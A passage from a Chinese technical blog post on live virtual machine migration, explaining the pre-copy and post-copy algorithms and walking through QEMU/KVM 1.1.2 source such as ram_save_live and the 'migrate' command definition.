&lt;li&gt;第三，虚拟机迁移（migration)，将虚拟机运行时状态从一台计算节点传输到另一台计算节点,保证虚拟机在源计算节点因失效或维护而停机时可以在目的端继续执行&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本文旨在讲解虚拟机迁移技术&lt;/p&gt;
&lt;h2 id=&quot;虚拟机迁移主要算法&quot;&gt;&lt;a href=&quot;#虚拟机迁移主要算法&quot; class=&quot;headerlink&quot; title=&quot;虚拟机迁移主要算法&quot;&gt;&lt;/a&gt;虚拟机迁移主要算法&lt;/h2&gt;&lt;p&gt;目前运用最广泛最原始的算法是预拷贝（pre-copy)算法和后拷贝（post-copy)算法，Pre-copy算法也被集成在主流虚拟机平台中如Xen,KVM,VMWare的官方源码中, Post-copy虽还没被各主流虚拟机平台集成，但个人实现起来也不是什么难事。 下面主要介绍这两种算法：&lt;/p&gt;
&lt;p&gt;Pre-copy, 先引用顶会 &lt;a href=&quot;https://www.usenix.org/legacy/event/nsdi05/tech/full_papers/clark/clark.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;NSDI’05 Live Migration of Virtual Machines&lt;/a&gt; 论文中的一张图，描述了pre-copy算法的时间线&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/precopy-step.png&quot; alt=&quot;pre-copy steps&quot;&gt;&lt;br&gt;简而言之，大致思想就是先迭代的迁移整个内存的所有页面，迭代过程中，如果页面有更新，则再迁移更新过的页面，直到满足一个条件让迭代过程收敛（这个条件可以自己根据不同情况合理设置），最后再迁移剩余的页面、cpu、寄存器等状态以及外部设备。&lt;br&gt;贴一个基于Qemu/kvm 1.1.2的pre-copy算法主要代码：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;ram_save_live&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(QEMUFile *f, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; stage, &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *opaque)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;ram_addr_t&lt;/span&gt; addr;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;uint64_t&lt;/span&gt; bytes_transferred_last;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;double&lt;/span&gt; bwidth = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;uint64_t&lt;/span&gt; expected_time = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (stage &amp;lt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        memory_global_dirty_log_stop();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    memory_global_sync_dirty_bitmap(get_system_memory());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (stage == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        RAMBlock *block;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bytes_transferred = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        last_block = &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        last_offset = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        sort_ram_list();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* Make sure all dirty bits are set */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        QLIST_FOREACH(block, &amp;amp;ram_list.blocks, next) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (addr = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; addr &amp;lt; block-&amp;gt;length; addr += TARGET_PAGE_SIZE) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!memory_region_get_dirty(block-&amp;gt;mr, addr, TARGET_PAGE_SIZE,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                             DIRTY_MEMORY_MIGRATION)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    memory_region_set_dirty(block-&amp;gt;mr, addr, TARGET_PAGE_SIZE);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        memory_global_dirty_log_start();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        qemu_put_be64(f, ram_bytes_total() | RAM_SAVE_FLAG_MEM_SIZE);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        QLIST_FOREACH(block, &amp;amp;ram_list.blocks, next) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            qemu_put_byte(f, &lt;span class=&quot;built_in&quot;&gt;strlen&lt;/span&gt;(block-&amp;gt;idstr));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            qemu_put_buffer(f, (&lt;span class=&quot;keyword&quot;&gt;uint8_t&lt;/span&gt; *)block-&amp;gt;idstr, &lt;span class=&quot;built_in&quot;&gt;strlen&lt;/span&gt;(block-&amp;gt;idstr));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            qemu_put_be64(f, block-&amp;gt;length);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    bytes_transferred_last = bytes_transferred;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    bwidth = qemu_get_clock_ns(rt_clock);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; ((ret = qemu_file_rate_limit(f)) == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; bytes_sent;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bytes_sent = ram_save_block(f);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bytes_transferred += bytes_sent;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (bytes_sent == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123; &lt;span class=&quot;comment&quot;&gt;/* no more blocks */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ret &amp;lt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    bwidth = qemu_get_clock_ns(rt_clock) - bwidth;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    bwidth = (bytes_transferred - bytes_transferred_last) / bwidth;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* if we haven&#39;t transferred anything this round, force expected_time to a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     * a very high value, but without crashing */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (bwidth == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bwidth = &lt;span class=&quot;number&quot;&gt;0.000001&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* try transferring iterative blocks of memory */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (stage == &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; bytes_sent;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* flush all remaining blocks regardless of rate limiting */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; ((bytes_sent = ram_save_block(f)) != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            bytes_transferred += bytes_sent;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        memory_global_dirty_log_stop();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    qemu_put_be64(f, RAM_SAVE_FLAG_EOS);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    expected_time = ram_save_remaining() * TARGET_PAGE_SIZE / bwidth;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return (stage == &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) &amp;amp;&amp;amp; (expected_time &amp;lt;= migrate_max_downtime());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;第一阶段，（14-42），代码所有的内存被标记为脏页并初始化页面更新追踪机制&lt;/li&gt;
&lt;li&gt;第二阶段，（47-55），如果页面被标记为脏页，则传输这些页面，页面脏位被重置，如果有程序修改页面，页面的脏位又可设置。一般来说，第二阶段是迭代过程最长的&lt;/li&gt;
&lt;li&gt;第三阶段，（71-79），那些修改过的却还没有来得及被传输到目的端的页面可以用来计算停机时间，设置一个目标停机时间，当达到这个值的时候，停止第二阶段的迭代过程，进入第三阶段，这时源虚拟机被暂停，将剩余的页面、CPU等状态一同传输到目的端，目的端再重新恢复虚拟机。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;pre-copy总体来说能带来很小的停机时间，但不太适合写密集型的负载，写密集型负载会大量更新页面，使得迭代过程结束后的剩余页面增多，延长停机时间。&lt;/p&gt;
&lt;p&gt;下面再来看看post-copy算法&lt;/p&gt;
&lt;p&gt;Post-copy算法的思想是先暂停源虚拟机，把能保证一次正常运行的最小运行集（所有的CPU状态）传输到目的端，目的端恢复虚拟机的执行，若需要内存页，则产生页错误，主动从源虚拟机中获取。Post-copy能保证尽可能的做到个内存也最多只传输一次，避免pre-copy算法迭代过程中的重复传输；由于不断地从源端获取丢失页，不可避免地带来性能损失。&lt;a href=&quot;http://www.cs.binghamton.edu/~mhines/papers/vee2009.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;VEE’09 Post-Copy Based Live Virtual Machine Migration Using Adaptive Pre-Paging and Dynamic Self-Ballooning&lt;/a&gt; 利用了一种称之为&lt;code&gt;adaptive pre-paging&lt;/code&gt;的方法来减少页错误，&lt;code&gt;adaptive pre-paging&lt;/code&gt;能尽可能的预测出目的端下一个需要的页面，从而减少页面传输的次数。&lt;/p&gt;
&lt;h2 id=&quot;实现-Pre-copy&quot;&gt;&lt;a href=&quot;#实现-Pre-copy&quot; class=&quot;headerlink&quot; title=&quot;实现 Pre-copy&quot;&gt;&lt;/a&gt;实现 Pre-copy&lt;/h2&gt;&lt;p&gt;这一章节主要讲述KVM/Qemu关于Pre-copy迁移算法的实现，基于qemu-kvm-1.1.2版本。首先看一下源码中的hmp-commands.hx文件内容：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        .name       = &amp;quot;migrate&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        .args_type  = &amp;quot;detach:-d,blk:-b,inc:-i,uri:s&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        .params     = &amp;quot;[-d] [-b] [-i] uri&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        .help       = &amp;quot;migrate to URI (using -d to not wait for completion)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		      &amp;quot;\n\t\t\t -b for migration without shared storage with&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		      &amp;quot; full copy of disk\n\t\t\t -i for migration without &amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		      &amp;quot;shared storage with incremental copy of disk &amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		      &amp;quot;(base image shared between src and destination)&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        .mhandler.cmd = hmp_migrate,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;STEXI&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;@item migrate [-d] [-b] [-i] @var&amp;#123;uri&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;@findex migrate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Migrate to @var&amp;#123;uri&amp;#125; (using -d to not wait for completion).&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	-b for migration with full copy of disk&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	-i for migration with incremental copy of disk (base image is shared)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ETEXI&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;每一个Qemu相关命令都需要在此文件中注册，如savevm,snapshot,migrate等，如果想自定义命令，亦是如此，关于如何修改KVM/Qemu源码，可以结合我的 &lt;a href=&quot;http://www.chongh.wiki/blog/2016/01/01/kvm-qemu-bytalk/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;上一篇&lt;/a&gt; 文章.&lt;/p&gt;
&lt;p&gt;Qemu-kvm利用&lt;code&gt;hmp-commands.hx&lt;/code&gt;这个文件保存相应的命令行参数以及常量，然后使用&lt;code&gt;hxtool&lt;/code&gt;工具产生对应的头文件&lt;code&gt;hmp-commands.h&lt;/code&gt;到&lt;code&gt;./x86_64-softmmu&lt;/code&gt;文件夹中，这个过程自动进行。注，STEXI与ETEXI之间的内容属于注释内容。从代码中可看到，与迁移命令migrate相对应的处理函数是&lt;code&gt;hmp_migrate&lt;/code&gt;,从&lt;code&gt;hmp_migrate&lt;/code&gt;函数开始，会依次调用&lt;code&gt;qmp_migrate&lt;/code&gt;,&lt;code&gt;tcp_start_outgoing_migration&lt;/code&gt;,&lt;code&gt;migrate_fd_connect&lt;/code&gt;, &lt;code&gt;migrate_fd_put_ready&lt;/code&gt;,具体可看源码，不一一详细介绍。&lt;/p&gt;
